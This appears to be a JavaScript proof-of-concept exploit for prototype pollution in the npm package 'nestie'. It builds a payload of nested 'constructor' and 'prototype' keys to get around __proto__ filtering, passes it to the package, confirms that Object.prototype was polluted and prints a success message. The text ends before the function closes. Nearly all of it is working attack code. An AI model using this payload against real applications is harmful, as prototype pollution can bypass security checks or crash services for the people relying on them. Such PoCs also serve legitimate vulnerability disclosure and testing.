async function exploit() {
  // Dynamically load the package and safely resolve its export
  const mod = await import('nestie');
  const nestie = mod.default || mod.nestie;

  // Payload targeting 'constructor' and 'prototype' keys to bypass __proto__ filtering
  // This structure exploits how the function recursively assigns keys during object flattening/merging.
  const payload = { 
    "constructor": { 
      "prototype": { 
        "exploited": true 
      } 
    } 
  };

  // Invoke the vulnerable entry point
  await nestie(payload);

  // Verification: directly inspect Object.prototype for the injected property
  if (Object.prototype.exploited !== true) {
    throw new Error('PoC failed: Object.prototype was not polluted with "exploited"');
  }

  console.log('[+] Proof-of-concept successful: Object.prototype is now polluted with "exploited" =', Object.prototype.exploited);
